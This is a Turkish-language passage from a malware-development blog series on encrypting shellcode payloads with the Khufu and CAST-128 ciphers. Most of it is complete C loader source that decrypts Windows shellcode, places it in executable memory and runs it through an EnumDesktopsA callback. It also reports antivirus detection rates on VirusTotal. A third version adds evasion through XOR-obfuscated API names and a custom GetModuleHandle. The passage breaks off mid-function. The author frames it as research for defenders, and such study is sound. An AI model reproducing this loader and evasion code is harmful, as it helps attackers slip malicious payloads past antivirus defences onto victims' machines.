{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
khufu_decrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (8 - my_payload_len % 8) % 8;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len);
memcpy(padded, my_payload, my_payload_len);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

khufu_encrypt_shellcode(padded, pad_len);

printf("encrypted shellcode: ");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

khufu_decrypt_shellcode(padded, pad_len);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)
NULL);
return 0;
}
Bu örnek, Khufu şifreleme algoritmasını kullanarak payload’u şifreleme ve şifre çözme işlemlerinin nasıl yapılacağını göstermektedir. Doğruluk kontrolü için karşılaştırma ve yazdırma mantığı eklenmiştir.
Demo

Her şeyi çalışırken görelim. Derleyelim (Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, sadece mağdurun makinesinde (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Görüldüğü gibi, her şey mükemmel çalıştı! =..=
Shannon entropisini hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Payload’umuz .text bölümünde.
Hadi hack.exe dosyasını VirusTotal’a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/3a83cabfaa701d9b23b4b78c4c81084ada736afd
b20e0a67581c9208c1a0249a/detection
Gördüğünüz gibi, sadece 45 AV motorundan 15’i dosyamızı kötü amaçlı olarak algılıyor.
Ancak bu sonuç, payload’un şifrelenmesinden değil, VirtualAlloc, RtlMoveMemory ve EnumDesktopsA gibi bazı Windows API çağrılarından kaynaklanmaktadır.
Bazı AV istatistiklerinin zaman aşımına uğradığını unutmayın:
+++++++++++++++++++++++++++++++++++++++++++++++
Khufu algoritmasının diferansiyel kriptoanalize karşı dayanıklılığı, anahtara bağlı ve gizli S-kutularının kullanımı nedeniyle oluşmaktadır. 16 turlu Khufu şifrelemesine karşı diferansiyel bir saldırı keşfedilmiş olup, 2^31 seçilmiş düz metinle şifreleme anahtarının kurtarılmasına olanak tanımaktadır (H. Gilbert ve P. Chauvaud, “A Chosen Plaintext Attack of the 16-Round Khufu Cryptosystem,” Advances in Cryptology - CRYPTO ’94 Proceedings, Springer-Verlag, 1994).Ancak bu saldırı, daha fazla tur sayısına sahip bir şifreleme için geçerli değildir.
Bu gönderinin, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olmasını, mavi takım üyelerinin bu ilginç şifreleme tekniği hakkında farkındalık kazanmasını sağlamasını ve kırmızı takımın cephaneliğine bir silah eklemesini umuyorum.
Khufu and Khafre
H. Gilbert and P. Chauvaud - A Chosen Plaintext Attack of the 16-round Khufu Cryp-
tosystem
Malware and cryptography 1
Github’taki kaynak kod


94. kötü amaçlı yazılım ve kriptografi araştırması - bölüm 3 (31): CAST-128 payload şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, kötü amaçlı yazılım geliştirmede CAST-128 blok şifreleyicisinin kullanımına dair kendi araştırmamın sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, payload’u şifrelemek/şifresini çözmek için bunu uygularsak ne olacağını kontrol etmeye karar verdim.
CAST-128

CAST-128 şifreleme yöntemi, DES'e benzeyen ve bir substitüsyon-permutasyon ağı (SPN) kullanan bir kriptografik sistemdir. Diferansiyel kriptanaliz, doğrusal kriptanaliz ve ilişkili anahtar kriptanalizine karşı güçlü bir direnç gösterdiği kanıtlanmıştır.
CAST-128, 12 veya 16 turdan oluşan bir Feistel şifresidir. 64 bitlik bloklar üzerinde çalışır ve 128 bit uzunluğa kadar anahtarları destekler. Şifre, doğrusal ve diferansiyel saldırılara karşı korunmak için döndürme işlemleri içerir. CAST-128’in tur fonksiyonu, XOR, toplama ve çıkarma (mod 2**32) işlemlerinin bir kombinasyonunu kullanır. Ayrıca, şifreleme işlemi boyunca üç farklı tur fonksiyon varyasyonu kullanır.
pratik örnek

Öncelikle, 128 bitlik bir anahtara ihtiyacımız var:
uint32_t key[4] = {0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210};
128 bitlik bir anahtar (key[4]), dört 32 bitlik tamsayı ile başlatılır. Bu anahtar, CAST-128 şifreleme ve şifre çözme işlemlerinde kullanılacaktır.
Daha sonra CAST-128 tur fonksiyonlarına ihtiyacımız var:
void f1(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib) & 0xFFFF); // ensure no overflow
*d = (*d + f) & 0xFFFFFFFF;
}

void f2(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib + 1) & 0xFFFF); // avoid division by zero
*d = (*d ^ f) & 0xFFFFFFFF;
}

void f3(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia - Ib) & 0xFFFF); // ensure no overflow
*d = (*d ^ f) & 0xFFFFFFFF;
}
f1, f2 ve f3 fonksiyonları: benim durumumda bunlar, CAST-128'de kullanılan tur fonksiyonlarının basitleştirilmiş versiyonlarıdır. Her fonksiyon, bir 32 bitlik kelimeye (d) işaretçi ve 32 bitlik bir alt anahtar (k) alır. Fonksiyonlar, d'nin değerini değiştirmek için bit düzeyinde ve aritmetik işlemler uygular.
Bir sonraki adım, cast_key_schedule fonksiyonudur; bu fonksiyon, şifreleme veya şifre çözme işleminin her turu için alt anahtarları hazırlar. Ana anahtara dayalı olarak bir alt anahtar dizisini (subkeys[ROUNDS][4]) başlatır:
void cast_key_schedule(uint32_t* key, uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < ROUNDS; i++) {
subkeys[i][0] = key[0];
subkeys[i][1] = key[1];
subkeys[i][2] = key[2];
subkeys[i][3] = key[3];
}
}
Bir sonraki adım, CAST-128 şifreleme mantığıdır:
void cast_encrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];
for (int i = 0; i < ROUNDS; i++) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}

block[0] = right;
block[1] = left;
}
Mantık basittir, cast_encrypt fonksiyonu, CAST-128 algoritmasını kullanarak bir veri bloğunu şifreler. 32 bitlik kelime çiftleri (sol ve sağ) üzerinde çalışır. Her turda, tur fonksiyonlarından biri (f1, f2 veya f3) uygulanır ve sonuçlar bloğu değiştirmek için kullanılır.
Daha sonra, cast_decrypt fonksiyonu bir veri bloğunun şifresini çözer. cast_encrypt fonksiyonuna benzer şekilde çalışır ancak turları ters sırayla işler:
void cast_decrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];

for (int i = ROUNDS - 1; i >= 0; i--) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}

block[0] = right;
block[1] = left;
}
Ana mantık, shellcode şifreleme ve şifre çözme fonksiyonlarını içermektedir:
void cast_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_encrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}
void cast_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_decrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}
Gördüğünüz gibi, shellcode'u blok blok (her seferinde 8 bayt) işlerler. Shellcode uzunluğu blok boyutunun katı değilse, şifreleme öncesinde dolgu (0x90) eklenir ve ardından şifre çözme işlemi buna göre gerçekleştirilir.
Son olarak, payload’u çalıştırmamız gerekir:
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
unsigned char padded[my_payload_len];
memcpy(padded, my_payload, my_payload_len);

uint32_t subkeys[ROUNDS][4];
cast_key_schedule(key, subkeys);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

cast_encrypt_shellcode(padded, my_payload_len, subkeys);

printf("encrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

cast_decrypt_shellcode(padded, my_payload_len, subkeys);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)
NULL);
return 0;
}
Ana fonksiyonda, bir payload(shellcode) tanımlanır ve anahtar planlaması oluşturulur. Shellcode, CAST-128 algoritması kullanılarak şifrelenir ve ardından şifresi çözülür.
Her zamanki gibi, meow-meow messagebox payload’u kullandım:
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";
ve şifresi çözülmüş payload, EnumDesktopsA fonksiyonu kullanılarak yürütülür.
Tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* encrypt/decrypt payload
* via CAST-128 algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/29/malware-cryptography-31.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define BLOCK_SIZE 8
#define ROUNDS 16
#define KEY_SIZE 16
uint32_t key[4] = {0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210};

// CAST-128 round functions (simplified for demonstration)
void f1(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib) & 0xFFFF); // ensure no overflow
*d = (*d + f) & 0xFFFFFFFF;
}

void f2(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib + 1) & 0xFFFF); // avoid division by zero
*d = (*d ^ f) & 0xFFFFFFFF;
}

void f3(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia - Ib) & 0xFFFF); // ensure no overflow
*d = (*d ^ f) & 0xFFFFFFFF;
}

// key schedule for CAST-128
void cast_key_schedule(uint32_t* key, uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < ROUNDS; i++) {
subkeys[i][0] = key[0];
subkeys[i][1] = key[1];
subkeys[i][2] = key[2];
subkeys[i][3] = key[3];
}
}

// CAST-128 encryption
void cast_encrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];

for (int i = 0; i < ROUNDS; i++) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}
block[0] = right;
block[1] = left;
}

// CAST-128 decryption
void cast_decrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];

for (int i = ROUNDS - 1; i >= 0; i--) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}
block[0] = right;
block[1] = left;
}

void cast_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_encrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}

void cast_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_decrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
unsigned char padded[my_payload_len];
memcpy(padded, my_payload, my_payload_len);

uint32_t subkeys[ROUNDS][4];
cast_key_schedule(key, subkeys);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

cast_encrypt_shellcode(padded, my_payload_len, subkeys);

printf("encrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

cast_decrypt_shellcode(padded, my_payload_len, subkeys);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)
NULL);
return 0;
}
Bu örnek, CAST-128 şifreleme algoritmasını kullanarak bir payload’u şifrelemeyi ve şifresini çözmeyi göstermektedir. Doğruluğunu kontrol etmek için eklenen yazdırma mantığı bulunmaktadır.
Demo

Hadi her şeyi çalışırken görelim. Derleyelim (Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, hedef makinede (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisini hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++

payload’umuzu .text bölümünde.
pratik örnek 2

Basit mantığımızı güncelleyelim, sadece tüm payload şifre çözme ve çalıştırma işlemini değiştirerek shellcode'u şu şekilde şifre çözüp çalıştırın:
void cast_decrypt_and_execute_shellcode(unsigned char* shellcode, int
shellcode_len, uint32_t subkeys[ROUNDS][4]) {
LPVOID mem_block = NULL;
// allocate a single block for execution
mem_block = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
if (mem_block == NULL) {
printf("memory allocation failed\n");
exit(1);
}

// decrypt the entire shellcode into the allocated memory
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
uint32_t decrypted_block[2];
memcpy(decrypted_block, shellcode + i * BLOCK_SIZE, BLOCK_SIZE);
cast_decrypt(decrypted_block, subkeys);
memcpy((char *)mem_block + i * BLOCK_SIZE, decrypted_block, BLOCK_SIZE);
}

// execute the shellcode using EnumDesktopsA
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem_block,
(LPARAM)NULL);
}
demo 2
Hadi ikinci versiyonu çalışırken görelim. Derleyelim (Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack2.c -o hack2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, bu versiyonu Windows 11 x64 üzerinde çalıştırın:
.\hack2.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Bu versiyon da mükemmel çalıştı.
pratik örnek 3
Ana "kötü amaçlı yazılımımızı" güncelleyelim: fonksiyon çağrısı bulanıklığı, fonksiyon adlarını karma hale getirme, GetModuleHandle ve GetProcAddress uygulamalarını ekleyerek bazı kaçınma teknikleri ekleyelim.

Bu versiyon şu şekildedir - hack3.c:
/*
* hack3.c
* encrypt/decrypt payload
* via CAST-128 algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/29/malware-cryptography-31.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h>

#define BLOCK_SIZE 8
#define ROUNDS 16
#define KEY_SIZE 16

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
_wcslwr_s(substr, MAX_PATH);
_wcslwr_s(mystr, MAX_PATH);
int result = 0;
if (StrStrW(mystr, substr) != NULL) {
	result = 1;
}
return result;
}

typedef BOOL (CALLBACK * EnumDesktopsA_t)(
HWINSTA hwinsta,
DESKTOPENUMPROCA lpEnumFunc,
LPARAM lParam
);

LPVOID (WINAPI * pva)(LPVOID lpAddress, SIZE_T dwSize,
DWORD flAllocationType, DWORD flProtect);

unsigned char cva[] =
{ 0x27, 0x1c, 0x13, 0x17, 0x1e, 0x10, 0x19, 0x20, 0xf, 0x7, 0x1e, 0x16 };
unsigned char udll[] =
{ 0x4, 0x6, 0x4, 0x11, 0x58, 0x43, 0x5b, 0x5, 0xf, 0x7 };
unsigned char kdll[] =
{ 0x1a, 0x10, 0x13, 0xd, 0xe, 0x1d, 0x46, 0x53, 0x4d, 0xf, 0x1d, 0x19 };

char secretKey[] = "quackquack";
// encryption / decryption XOR function
void d(char *buffer, size_t bufferLength, char *key, size_t keyLength) {
int keyIndex = 0;
for (int i = 0; i < bufferLength; i++) {
if (keyIndex == keyLength - 1) keyIndex = 0;
buffer[i] = buffer[i] ^ key[keyIndex];
keyIndex++;
}
}

// custom implementation
HMODULE myGM(LPCWSTR lModuleName) {

// obtaining the offset of PPEB from the beginning of TEB
PEB* pPeb = (PEB*)__readgsqword(0x60);

// obtaining the address of the head node in a linked list
// which represents all the models that are loaded into the process.
PEB_LDR_DATA* Ldr = pPeb->Ldr;
LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

// iterating to the next node. this will be our starting point.
LIST_ENTRY* pStartListEntry = ModuleList->Flink;

// iterating through the linked list.
WCHAR mystr[MAX_PATH] = { 0 };
WCHAR substr[MAX_PATH] = { 0 };
for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList;
pListEntry = pListEntry->Flink) {
// getting the address of current
// LDR_DATA_TABLE_ENTRY (which represents the DLL).
LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)
((BYTE*)pListEntry - sizeof(LIST_ENTRY));

// checking if this is the DLL we are looking for
memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
memset(substr, 0, MAX_PATH * sizeof(WCHAR));
wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
wcscpy_s(substr, MAX_PATH, lModuleName);
if (cmpUnicodeStr(substr, mystr)) {
// returning the DLL base address.
return (HMODULE)pEntry->DllBase;
	}
}

// the needed DLL wasn't found
printf("failed to get a handle to %s\n", lModuleName);
return NULL;
}

FARPROC myGPA(HMODULE hModule, LPCSTR lpProcName) {
